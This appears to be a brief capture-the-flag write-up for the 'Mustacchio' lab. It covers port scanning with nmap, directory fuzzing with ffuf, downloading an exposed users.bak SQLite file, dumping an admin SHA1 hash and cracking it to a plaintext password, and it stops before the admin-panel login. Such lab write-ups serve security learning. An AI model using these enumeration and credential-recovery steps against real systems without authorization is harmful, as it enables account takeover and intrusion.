# Mustacchio writeup
## nmap -p- -sV -n 10.10.238.61 -o nmap.txt
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
8765/tcp open  http    nginx 1.10.3 (Ubuntu)

step 1. check port 80
step 2. check port 8765
step 3. check port 22

http://10.10.238.61:8765/ - gives login page(admin panel)
## directory enumerate using FFUF on port 80
ffuf -u http://10.10.238.61/FUZZ -w /usr/share/wordlists/dirb/common.txt

http://10.10.238.61/custom/js/ -> found this path
there is a users.bak file
download this file using command wget http://10.10.238.61/custom/js/users.bak
file users.bak  -> helps us determine the file type. In this case it is an SQLite 3.x database, last written using SQLite version 3034001

lets try to open the same using sqlite3

$ sqlite3 users.bak                 
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
sqlite> .tables    -> it list the users table
users
sqlite> SELECT * FROM users;
admin|1868e36a6d2b17d4c2745f1659433a54d4bc5f4b

Go to https://crackstation.net/
this is a sha1 hash with value bulldog19

## lets login to port admin panel




